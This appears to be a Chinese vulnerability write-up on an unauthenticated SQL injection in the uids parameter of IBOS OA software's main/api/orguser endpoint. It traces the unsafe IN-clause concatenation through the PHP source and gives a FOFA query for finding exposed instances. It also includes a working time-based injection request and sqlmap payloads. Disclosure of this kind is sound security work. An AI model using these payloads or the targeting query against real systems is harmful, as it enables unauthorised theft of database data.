---
title: "IBOS企业协同管理软件 main/api/OrgUser SQL注入漏洞"
source: https://mrxn.net/jswz/IBOS-main-api-orguser-uids-sqli.html
asset_dir: embedded-base64
---

# 漏洞简介

深圳市博思协创网络科技有限公司开发的IBOS[企业](#)协同管理[软件](#)是一款基于Yii和bootstrap的开源OA/协同办公平台，连接全平台覆盖的酷办公客户端的企业办公平台，旨在提升企业内部沟通协作效率，实现工作流程的优化和[数据](#)管理的便捷。其系统main/api/orguser 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL注入")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，未授权攻击者可利用此漏洞获取系统数据库数据。

管理

# 影响版本

4.5.5

# fofa语法

> `app="IBOS企业协同管理软件"`

# 漏洞分析

根据[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")路径搜索直接找到了相关js(static/js/app/ibos.userData.js#L226)，可知传参 uids

```
getUserInfo: function(ids, callback) {
                var data, deptInfo, posInfo,
                    url = Ibos.app.url('main/api/orguser');

                $.post(url, {
                    uids: ids
                }, function(res) {
                    if (res.isSuccess) {
                        data = res.data;
                        callback && callback.call(null, data);
                    } else {
                        Ui && Ui.tip('无法获取成员信息', 'warning');
                        return false;
                    }
                }, 'json');
            },
```

深入探索

管理

企业

黑客与破解

继续看 Ibos.app.url 的实现，发现其系统路由获取如下 /static/js/src/common.js#L713

软件

```
    /**
     * 获取路由
     * @method url
     * @param  {String} route   由三个子参数组成的字符： 模块/控制器/动作
     * @param {Object} [param]  作为url参数的对象，{a: 1, b: 1}将解析为 a=1&b=1的格式
     * @example 
     *          Ibos.app.url('main/default/index');
     *          // ==> localhost/?r=main/default/index
     *          Ibos.app.url('main/default/index', { op: "add" });
     *          // ==> localhost/?r=main/default/index&op=add
     *          
     * @return {String}          Url地址
     */
    app.url = function(route, param) {
        route += "";
        if ((route).split("/").length !== 3) {
            // $.error("app.url: 参数route错误");
        } else {
            param = param ? '&' + $.param(param) : '';
            return this.g("SITE_URL") + "?r=" + route + param;
        }
    };
```

深入探索

编程

工程与技术

网络安全

因此根据这个直接定位 /system/modules/main/controllers/ApiController.php 里的 actionOrgUser() 函数

编程

```
    public function actionOrgUser()
    {
        $uids = Env::getRequest('uids');
        $uidArray = StringUtil::getUidAByUDPX($uids);
        $userArray = User::wrapUserInfo($uidArray, false, false);
        $return = array();
        $index = 0;
        foreach ( $userArray as $user ) {
                $return[$index]['id'] = 'u_' . $user['uid'];
                $return[$index]['text'] = $user['realname'];
                $return[$index]['mobile'] = $user['mobile'];
                // 头像小尺寸
                $return[$index]['avatar_small'] = Org::getDataStatic( $user['uid'], 'avatar', 'small' );
                // 头像中尺寸
                $return[$index]['avatar_middle'] = Org::getDataStatic( $user['uid'], 'avatar', 'middle' );
                // 头像大尺寸
                $return[$index]['avatar_big'] = Org::getDataStatic( $user['uid'], 'avatar', 'big' );
                $return[$index]['spaceurl'] = '?r=user/home/index&uid=' . $user['uid'];
                $return[$index]['department'] = empty( $user['deptname'] ) ? '' : $user['deptname'];
                $return[$index]['position'] = empty( $user['posname'] ) ? '' : $user['posname'];
                $return[$index]['role'] = empty( $user['rolename'] ) ? '' : $user['rolename'];
                $return[$index]['deptid'] = empty( $user['deptid'] ) ? 'c_0' : 'd_' . $user['deptid'];
                $return[$index]['positionid'] = empty( $user['positionid'] ) ? '' : 'p_' . $user['positionid'];
                $return[$index]['roleid'] = empty( $user['roleid'] ) ? '' : 'r_' . $user['roleid'];
                $index++;
        }
        return $this->ajaxReturn(array(
            'isSuccess' => true,
            'data' => $return,
        ));
    }
```

继续跟进 getUidAByUDPX 函数 system/core/utils/StringUtil.php#L645

脚本语言

```
    /**
     * 通过'u_1,d_1,p_1,r_1'或者array('u_1','d_1','p_1','r_1')这样的字符串或者数组获取uid
     * @param array|string $udpX
     * @return array
     */
    public static function getUidAByUDPX($udpX, $findC = false, $returnDisable = false, $returnRelated = true)
    {
        $udpA = is_array($udpX) ? $udpX : explode(',', $udpX);
        if ($findC) {
            $diff = array_intersect($udpA, array('c_0', 'alldept'));
            if (!empty($diff)) {
                return User::model()->fetchUidA($returnDisable);
            }
        }
        $uidA = $uArray = $dArray = $pArray = $rArray = array();
        foreach ($udpA as $row) {
            $pre = substr($row, 0, 1);
            if (strcmp($pre, 'u') == 0) {
                $uArray[] = substr($row, 2);
            }
            if (strcmp($pre, 'd') == 0) {
                $dArray[] = substr($row, 2);
            }
            if (strcmp($pre, 'p') == 0) {
                $pArray[] = substr($row, 2);
            }
            if (strcmp($pre, 'r') == 0) {
                $rArray[] = substr($row, 2);
            }
        }
        if (!empty($uArray)) {
            $uidA = array_merge($uidA, $uArray);
        }
        if (!empty($dArray)) {
            $uidFromD = User::model()->fetchAllUidByDeptids($dArray, $returnDisable, $returnRelated);
            $uidA = array_merge($uidA, $uidFromD);
        }
        if (!empty($pArray)) {
            $uidFromP = User::model()->fetchAllUidByPositionIds($pArray, $returnDisable, $returnRelated);
            $uidA = array_merge($uidA, $uidFromP);
        }
        if (!empty($rArray)) {
            $uidFromR = User::model()->fetchAllUidByRoleids($rArray, $returnDisable, $returnRelated);
            $uidA = array_merge($uidA, $uidFromR);
        }
        return array_unique($uidA);
    }
```

getUidAByUDPX() 通过处理输入的 $udpX（可以是字符串或数组）

黑客与破解

最终调用 fetchAllUidByDeptids 以及 generateInCondition 处理 where 语句后，执行SQL，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞

```
public static function generateInCondition($columnName, array $valueArr)
    {
        $ids = implode("','", $valueArr);
        $condition = sprintf("%s IN ('%s')", $columnName, $ids);

        return $condition;
    }

public function fetchAllUidByDeptids($deptids, $returnDisabled = true, $related = false)
{
    $deptIdArr = !is_array($deptids) ? explode(',', $deptids) : $deptids;
    $condition = util\StringUtil::generateInCondition('`u`.`deptid`', $deptIdArr);
    $query = Ibos::app()->db->createCommand();
    if (true === $related):
        $query = $query->leftJoin(DepartmentRelated::model()->tableName() . ' dr'
            , " `dr`.`uid` = `u`.`uid` ");
        $condition2 = util\StringUtil::generateInCondition('`dr`.`deptid`', $deptIdArr);
        $condition = array(
            'OR',
            $condition,
            $condition2,
        );
    endif;
    if (false === $returnDisabled):
        $condition = array(
            'AND',
            $condition,
            " `u`.`status` != '" . self::USER_STATUS_ABANDONED . "'",
        );
    endif;
    $uidArray = $query->selectDistinct('u.uid')
        ->from($this->tableName() . ' u')
        ->where($condition)
        ->queryColumn();
    return $uidArray;
}
```

因此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用只需要闭合单引号和左括号即可。

计算机科学

# 漏洞复现

会执行两次，一般延时时间为你的 payload 两倍时间

```
GET /?r=main/api/orguser&uids=u_1')%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(3)))a)%20AND%20('222'%3D'222 HTTP/1.1
Host: ibos.mrxn.net
```

sqlmap 结果

```
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uids=u_1') AND 2138=2138 AND ('ajshx'='ajshx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uids=u_1') AND (SELECT 6501 FROM (SELECT(SLEEP(4)))SrQj) AND ('HSYx'='HSYx
---
```

# 参考

- `https://github.com/fzbTech/IBOS.new`
- `https://gitee.com/ibos/IBOS`
